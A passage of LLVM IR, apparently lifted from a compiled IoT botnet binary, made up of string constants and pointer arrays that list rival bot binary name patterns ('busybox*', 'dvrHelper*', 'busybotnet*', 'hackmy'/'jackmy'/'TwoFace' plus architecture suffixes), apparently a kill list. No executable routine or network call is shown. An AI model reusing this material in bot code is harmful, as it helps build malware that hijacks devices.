@global_var_2246c.706, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_22474.707, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2247c.708, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22488.709, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22494.710, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_224a0.711, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_224ac.712, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_224b4.713, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_224c0.714, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_224d0.715, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_224d8.716, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_224e0.717, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_224ec.718, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_224f8.719, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22504.720, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22514.721, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22524.722, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22534.723, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22544.724, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22550.725, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2255c.726, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_2256c.727, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2257c.728, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2258c.729, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2259c.730, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_225a8.731, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_225b8.732, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_225cc.733, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_225d8.734, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_225e4.735, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_225f4.736, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22604.737, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21ff4.598, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22610.738, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2261c.739, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22624.740, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2262c.741, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22634.742, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2263c.743, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22644.744, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2264c.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22654.746, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2265c.747, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22664.748, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2266c.749, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22674.750, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2267c.751, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22684.752, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2268c.753, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22694.754, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2269c.755, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_226a4.756, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_226ac.757, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_226b4.758, i32 0, i32 0), i8* bitcast (i32* @global_var_226bc.759 to i8*), i8* bitcast (i32* @global_var_226c0.760 to i8*), i8* bitcast (i32* @global_var_226c4.761 to i8*), i8* bitcast (i32* @global_var_226c8.762 to i8*), i8* bitcast (i32* @global_var_226cc.763 to i8*), i8* bitcast (i32* @global_var_226d0.764 to i8*), i8* bitcast (i32* @global_var_226d4.765 to i8*), i8* bitcast (i32* @global_var_226d8.766 to i8*), i8* bitcast (i32* @global_var_226dc.767 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226e0.768, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226e4.769, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226e8.770, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226ec.771, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226f0.772, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226f4.773, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226f8.774, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_226fc.775, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22700.776, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22704.777, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22708.778, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2270c.779, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22710.780, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2271c.781, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22724.782, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2272c.783, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22734.784, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22738.785, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2273c.786, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22740.787, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22744.788, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22748.789, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2274c.790, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22750.791, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22754.792, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22758.793, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2275c.794, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22760.795, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22764.796, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22768.797, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2276c.798, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22770.799, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22774.800, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22778.801, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2277c.802, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22780.803, i32 0, i32 0)]
@global_var_2120c.806 = constant [8 x i8] c"jackmy*\00"
@global_var_21214.807 = constant [9 x i8] c"busybox*\00"
@global_var_21220.808 = constant [5 x i8] c"bin*\00"
@global_var_21238.809 = constant [5 x i8] c"arm*\00"
@global_var_21240.810 = constant [8 x i8] c"mipsel*\00"
@global_var_21250.811 = constant [8 x i8] c"mips64*\00"
@global_var_21258.812 = constant [6 x i8] c"i686*\00"
@global_var_21260.813 = constant [7 x i8] c"sparc*\00"
@global_var_2128c.814 = constant [6 x i8] c"bruv*\00"
@global_var_21294.815 = constant [7 x i8] c"sh2eb*\00"
@global_var_2129c.816 = constant [8 x i8] c"sh2elf*\00"
@global_var_212a4.817 = constant [5 x i8] c"x86*\00"
@global_var_212ac.818 = constant [7 x i8] c"armv5*\00"
@global_var_212b4.819 = constant [9 x i8] c"armv4tl*\00"
@global_var_212c0.820 = constant [7 x i8] c"armv4*\00"
@global_var_212c8.821 = constant [7 x i8] c"armv6*\00"
@global_var_212d0.822 = constant [9 x i8] c"powerpc*\00"
@global_var_212dc.823 = constant [14 x i8] c"powerpc440fp*\00"
@global_var_212ec.824 = constant [6 x i8] c"i586*\00"
@global_var_212f4.825 = constant [6 x i8] c"m68k*\00"
@global_var_212fc.826 = constant [8 x i8] c"x86_64*\00"
@global_var_21304.827 = constant [12 x i8] c"jackmymips*\00"
@global_var_21310.828 = constant [14 x i8] c"jackmymips64*\00"
@global_var_21320.829 = constant [14 x i8] c"jackmymipsel*\00"
@global_var_21330.830 = constant [13 x i8] c"jackmysh2eb*\00"
@global_var_21340.831 = constant [14 x i8] c"jackmysh2elf*\00"
@global_var_21350.832 = constant [11 x i8] c"jackmysh4*\00"
@global_var_2135c.833 = constant [11 x i8] c"jackmyx86*\00"
@global_var_21368.834 = constant [13 x i8] c"jackmyarmv5*\00"
@global_var_21378.835 = constant [15 x i8] c"jackmyarmv4tl*\00"
@global_var_21388.836 = constant [13 x i8] c"jackmyarmv4*\00"
@global_var_21398.837 = constant [13 x i8] c"jackmyarmv6*\00"
@global_var_213a8.838 = constant [12 x i8] c"jackmyi686*\00"
@global_var_213b4.839 = constant [15 x i8] c"jackmypowerpc*\00"
@global_var_213c4.840 = constant [20 x i8] c"jackmypowerpc440fp*\00"
@global_var_213d8.841 = constant [12 x i8] c"jackmyi586*\00"
@global_var_213e4.842 = constant [12 x i8] c"jackmym68k*\00"
@global_var_213f0.843 = constant [13 x i8] c"jackmysparc*\00"
@global_var_21400.844 = constant [14 x i8] c"jackmyx86_64*\00"
@global_var_21410.845 = constant [12 x i8] c"hackmymips*\00"
@global_var_2141c.846 = constant [14 x i8] c"hackmymips64*\00"
@global_var_2142c.847 = constant [14 x i8] c"hackmymipsel*\00"
@global_var_2143c.848 = constant [13 x i8] c"hackmysh2eb*\00"
@global_var_2144c.849 = constant [14 x i8] c"hackmysh2elf*\00"
@global_var_2145c.850 = constant [11 x i8] c"hackmysh4*\00"
@global_var_21468.851 = constant [11 x i8] c"hackmyx86*\00"
@global_var_21474.852 = constant [13 x i8] c"hackmyarmv5*\00"
@global_var_21484.853 = constant [15 x i8] c"hackmyarmv4tl*\00"
@global_var_21494.854 = constant [13 x i8] c"hackmyarmv4*\00"
@global_var_214a4.855 = constant [13 x i8] c"hackmyarmv6*\00"
@global_var_214b4.856 = constant [12 x i8] c"hackmyi686*\00"
@global_var_214c0.857 = constant [15 x i8] c"hackmypowerpc*\00"
@global_var_214d0.858 = constant [20 x i8] c"hackmypowerpc440fp*\00"
@global_var_214e4.859 = constant [12 x i8] c"hackmyi586*\00"
@global_var_214f0.860 = constant [12 x i8] c"hackmym68k*\00"
@global_var_214fc.861 = constant [13 x i8] c"hackmysparc*\00"
@global_var_2150c.862 = constant [14 x i8] c"hackmyx86_64*\00"
@global_var_2151c.863 = constant [4 x i8] c"b1*\00"
@global_var_21520.864 = constant [4 x i8] c"b2*\00"
@global_var_21524.865 = constant [4 x i8] c"b3*\00"
@global_var_21528.866 = constant [4 x i8] c"b4*\00"
@global_var_2152c.867 = constant [4 x i8] c"b5*\00"
@global_var_21530.868 = constant [4 x i8] c"b6*\00"
@global_var_21534.869 = constant [4 x i8] c"b7*\00"
@global_var_21538.870 = constant [4 x i8] c"b8*\00"
@global_var_2153c.871 = constant [4 x i8] c"b9*\00"
@global_var_21540.872 = constant [5 x i8] c"b10*\00"
@global_var_21548.873 = constant [5 x i8] c"b11*\00"
@global_var_21550.874 = constant [5 x i8] c"b12*\00"
@global_var_21558.875 = constant [5 x i8] c"b13*\00"
@global_var_21560.876 = constant [5 x i8] c"b14*\00"
@global_var_21568.877 = constant [5 x i8] c"b15*\00"
@global_var_21570.878 = constant [5 x i8] c"b16*\00"
@global_var_21578.879 = constant [5 x i8] c"b17*\00"
@global_var_21580.880 = constant [5 x i8] c"b18*\00"
@global_var_21588.881 = constant [5 x i8] c"b19*\00"
@global_var_21590.882 = constant [5 x i8] c"b20*\00"
@global_var_21598.883 = constant [18 x i8] c"busyboxterrorist*\00"
@global_var_215ac.884 = constant [10 x i8] c"DFhxdhdf*\00"
@global_var_215b8.885 = constant [11 x i8] c"dvrHelper*\00"
@global_var_215c4.886 = constant [9 x i8] c"FDFDHFC*\00"
@global_var_215d0.887 = constant [6 x i8] c"FEUB*\00"
@global_var_215d8.888 = constant [10 x i8] c"FTUdftui*\00"
@global_var_215e4.889 = constant [10 x i8] c"GHfjfgvj*\00"
@global_var_215f0.890 = constant [7 x i8] c"jhUOH*\00"
@global_var_215f8.891 = constant [10 x i8] c"JIPJIPJj*\00"
@global_var_21604.892 = constant [11 x i8] c"JIPJuipjh*\00"
@global_var_21610.893 = constant [9 x i8] c"kmymips*\00"
@global_var_2161c.894 = constant [11 x i8] c"kmymips64*\00"
@global_var_21628.895 = constant [11 x i8] c"kmymipsel*\00"
@global_var_21634.896 = constant [10 x i8] c"kmysh2eb*\00"
@global_var_21640.897 = constant [11 x i8] c"kmysh2elf*\00"
@global_var_2164c.898 = constant [8 x i8] c"kmysh4*\00"
@global_var_21654.899 = constant [8 x i8] c"kmyx86*\00"
@global_var_2165c.900 = constant [10 x i8] c"kmyarmv5*\00"
@global_var_21668.901 = constant [12 x i8] c"kmyarmv4tl*\00"
@global_var_21674.902 = constant [10 x i8] c"kmyarmv4*\00"
@global_var_21680.903 = constant [10 x i8] c"kmyarmv6*\00"
@global_var_2168c.904 = constant [9 x i8] c"kmyi686*\00"
@global_var_21698.905 = constant [12 x i8] c"kmypowerpc*\00"
@global_var_216a4.906 = constant [17 x i8] c"kmypowerpc440fp*\00"
@global_var_216b8.907 = constant [9 x i8] c"kmyi586*\00"
@global_var_216c4.908 = constant [9 x i8] c"kmym68k*\00"
@global_var_216d0.909 = constant [10 x i8] c"kmysparc*\00"
@global_var_216dc.910 = constant [11 x i8] c"kmyx86_64*\00"
@global_var_216e8.911 = constant [9 x i8] c"lolmips*\00"
@global_var_216f4.912 = constant [11 x i8] c"lolmips64*\00"
@global_var_21700.913 = constant [11 x i8] c"lolmipsel*\00"
@global_var_2170c.914 = constant [10 x i8] c"lolsh2eb*\00"
@global_var_21718.915 = constant [11 x i8] c"lolsh2elf*\00"
@global_var_21724.916 = constant [8 x i8] c"lolsh4*\00"
@global_var_2172c.917 = constant [8 x i8] c"lolx86*\00"
@global_var_21734.918 = constant [10 x i8] c"lolarmv5*\00"
@global_var_21740.919 = constant [12 x i8] c"lolarmv4tl*\00"
@global_var_2174c.920 = constant [10 x i8] c"lolarmv4*\00"
@global_var_21758.921 = constant [10 x i8] c"lolarmv6*\00"
@global_var_21764.922 = constant [9 x i8] c"loli686*\00"
@global_var_21770.923 = constant [12 x i8] c"lolpowerpc*\00"
@global_var_2177c.924 = constant [17 x i8] c"lolpowerpc440fp*\00"
@global_var_21790.925 = constant [9 x i8] c"loli586*\00"
@global_var_2179c.926 = constant [9 x i8] c"lolm68k*\00"
@global_var_217a8.927 = constant [10 x i8] c"lolsparc*\00"
@global_var_217b4.928 = constant [9 x i8] c"RYrydry*\00"
@global_var_217c0.929 = constant [9 x i8] c"telmips*\00"
@global_var_217cc.930 = constant [11 x i8] c"telmips64*\00"
@global_var_217d8.931 = constant [11 x i8] c"telmipsel*\00"
@global_var_217e4.932 = constant [10 x i8] c"telsh2eb*\00"
@global_var_217f0.933 = constant [11 x i8] c"telsh2elf*\00"
@global_var_217fc.934 = constant [8 x i8] c"telsh4*\00"
@global_var_21804.935 = constant [8 x i8] c"telx86*\00"
@global_var_2180c.936 = constant [10 x i8] c"telarmv5*\00"
@global_var_21818.937 = constant [12 x i8] c"telarmv4tl*\00"
@global_var_21824.938 = constant [10 x i8] c"telarmv4*\00"
@global_var_21830.939 = constant [10 x i8] c"telarmv6*\00"
@global_var_2183c.940 = constant [9 x i8] c"teli686*\00"
@global_var_21848.941 = constant [12 x i8] c"telpowerpc*\00"
@global_var_21854.942 = constant [17 x i8] c"telpowerpc440fp*\00"
@global_var_21868.943 = constant [9 x i8] c"teli586*\00"
@global_var_21874.944 = constant [9 x i8] c"telm68k*\00"
@global_var_21880.945 = constant [10 x i8] c"telsparc*\00"
@global_var_2188c.946 = constant [11 x i8] c"telx86_64*\00"
@global_var_21898.947 = constant [13 x i8] c"TwoFacemips*\00"
@global_var_218a8.948 = constant [15 x i8] c"TwoFacemips64*\00"
@global_var_218b8.949 = constant [15 x i8] c"TwoFacemipsel*\00"
@global_var_218c8.950 = constant [14 x i8] c"TwoFacesh2eb*\00"
@global_var_218d8.951 = constant [15 x i8] c"TwoFacesh2elf*\00"
@global_var_218e8.952 = constant [12 x i8] c"TwoFacesh4*\00"
@global_var_218f4.953 = constant [12 x i8] c"TwoFacex86*\00"
@global_var_21900.954 = constant [14 x i8] c"TwoFacearmv5*\00"
@global_var_21910.955 = constant [16 x i8] c"TwoFacearmv4tl*\00"
@global_var_21920.956 = constant [14 x i8] c"TwoFacearmv4*\00"
@global_var_21930.957 = constant [14 x i8] c"TwoFacearmv6*\00"
@global_var_21940.958 = constant [13 x i8] c"TwoFacei686*\00"
@global_var_21950.959 = constant [16 x i8] c"TwoFacepowerpc*\00"
@global_var_21960.960 = constant [21 x i8] c"TwoFacepowerpc440fp*\00"
@global_var_21978.961 = constant [13 x i8] c"TwoFacei586*\00"
@global_var_21988.962 = constant [13 x i8] c"TwoFacem68k*\00"
@global_var_21998.963 = constant [14 x i8] c"TwoFacesparc*\00"
@global_var_219a8.964 = constant [15 x i8] c"TwoFacex86_64*\00"
@global_var_219b8.965 = constant [10 x i8] c"UYyuyioy*\00"
@global_var_219c4.966 = constant [10 x i8] c"XDzdfxzf*\00"
@global_var_219d0.967 = constant [6 x i8] c"xxb1*\00"
@global_var_219d8.968 = constant [6 x i8] c"xxb2*\00"
@global_var_219e0.969 = constant [6 x i8] c"xxb3*\00"
@global_var_219e8.970 = constant [6 x i8] c"xxb4*\00"
@global_var_219f0.971 = constant [6 x i8] c"xxb5*\00"
@global_var_219f8.972 = constant [6 x i8] c"xxb6*\00"
@global_var_21a00.973 = constant [6 x i8] c"xxb7*\00"
@global_var_21a08.974 = constant [6 x i8] c"xxb8*\00"
@global_var_21a10.975 = constant [6 x i8] c"xxb9*\00"
@global_var_21a18.976 = constant [7 x i8] c"xxb10*\00"
@global_var_21a20.977 = constant [7 x i8] c"xxb11*\00"
@global_var_21a28.978 = constant [7 x i8] c"xxb12*\00"
@global_var_21a30.979 = constant [7 x i8] c"xxb13*\00"
@global_var_21a38.980 = constant [7 x i8] c"xxb14*\00"
@global_var_21a40.981 = constant [7 x i8] c"xxb15*\00"
@global_var_21a48.982 = constant [7 x i8] c"xxb16*\00"
@global_var_21a50.983 = constant [7 x i8] c"xxb17*\00"
@global_var_21a58.984 = constant [7 x i8] c"xxb18*\00"
@global_var_21a60.985 = constant [7 x i8] c"xxb19*\00"
@global_var_21a68.986 = constant [7 x i8] c"xxb20*\00"
@global_var_21a70.987 = constant [3 x i8] c"1*\00"
@global_var_21a74.988 = constant [3 x i8] c"2*\00"
@global_var_21a78.989 = constant [3 x i8] c"3*\00"
@global_var_21a7c.990 = constant [3 x i8] c"4*\00"
@global_var_21a80.991 = constant [3 x i8] c"5*\00"
@global_var_21a84.992 = constant [3 x i8] c"6*\00"
@global_var_21a88.993 = constant [3 x i8] c"7*\00"
@global_var_21a8c.994 = constant [3 x i8] c"8*\00"
@global_var_21a90.995 = constant [3 x i8] c"9*\00"
@global_var_21a94.996 = constant [4 x i8] c"10*\00"
@global_var_21a98.997 = constant [4 x i8] c"11*\00"
@global_var_21a9c.998 = constant [4 x i8] c"12*\00"
@global_var_21aa0.999 = constant [4 x i8] c"13*\00"
@global_var_21aa4.1000 = constant [4 x i8] c"14*\00"
@global_var_21aa8.1001 = constant [4 x i8] c"15*\00"
@global_var_21aac.1002 = constant [4 x i8] c"16*\00"
@global_var_21ab0.1003 = constant [4 x i8] c"17*\00"
@global_var_21ab4.1004 = constant [4 x i8] c"18*\00"
@global_var_21ab8.1005 = constant [4 x i8] c"19*\00"
@global_var_21abc.1006 = constant [4 x i8] c"20*\00"
@global_var_21ac0.1007 = constant [4 x i8] c"bb*\00"
@global_var_21ac4.1008 = constant [12 x i8] c"busybotnet*\00"
@global_var_21ad0.1009 = constant [6 x i8] c"pppd*\00"
@global_var_21ad8.1010 = constant [7 x i8] c"pppoe*\00"
@global_var_21ae0.1011 = constant [6 x i8] c"wput*\00"
@global_var_21ae8.1012 = constant [4 x i8] c"B1*\00"
@global_var_21aec.1013 = constant [4 x i8] c"B2*\00"
@global_var_21af0.1014 = constant [4 x i8] c"B3*\00"
@global_var_21af4.1015 = constant [4 x i8] c"B4*\00"
@global_var_21af8.1016 = constant [4 x i8] c"B5*\00"
@global_var_21afc.1017 = constant [4 x i8] c"B6*\00"
@global_var_21b00.1018 = constant [4 x i8] c"B7*\00"
@global_var_21b04.1019 = constant [4 x i8] c"B8*\00"
@global_var_21b08.1020 = constant [4 x i8] c"B9*\00"
@global_var_21b0c.1021 = constant [5 x i8] c"B10*\00"
@global_var_21b14.1022 = constant [5 x i8] c"B11*\00"
@global_var_21b1c.1023 = constant [5 x i8] c"B12*\00"
@global_var_21b24.1024 = constant [5 x i8] c"B13*\00"
@global_var_21b2c.1025 = constant [5 x i8] c"B14*\00"
@global_var_21b34.1026 = constant [5 x i8] c"B15*\00"
@global_var_21b3c.1027 = constant [5 x i8] c"B16*\00"
@global_var_21b44.1028 = constant [5 x i8] c"B17*\00"
@global_var_21b4c.1029 = constant [5 x i8] c"B18*\00"
@global_var_21b54.1030 = constant [5 x i8] c"B20*\00"
@global_var_21b5c.1031 = constant [11 x i8] c"dvrhelper*\00"
@global_var_21b68.1032 = constant [241 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2120c.806, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21214.807, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21220.808, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21228.572, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21230.577, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21238.809, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21240.810, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21248.571, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21250.811, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21258.812, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21260.813, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21268.575, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21270.566, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21278.576, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21284.568, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2128c.814, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21248.571, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21250.811, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21240.810, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21294.815, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2129c.816, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21268.575, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_212a4.817, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21238.809, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_212ac.818, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_212b4.819, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_212c0.820, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_212c8.821, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21258.812, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_212d0.822, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_212dc.823, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_212ec.824, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_212f4.825, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21260.813, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_212fc.826, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21304.827, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21310.828, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21320.829, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21330.830, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21340.831, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21350.832, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2135c.833, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21368.834, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_21378.835, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21388.836, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21398.837, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_213a8.838, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_213b4.839, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_213c4.840, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_213d8.841, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_213e4.842, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_213f0.843, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21400.844, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21410.845, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2141c.846, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2142c.847, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2143c.848, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2144c.849, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2145c.850, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21468.851, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21474.852, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_21484.853, i32 0, i32 0), i8* 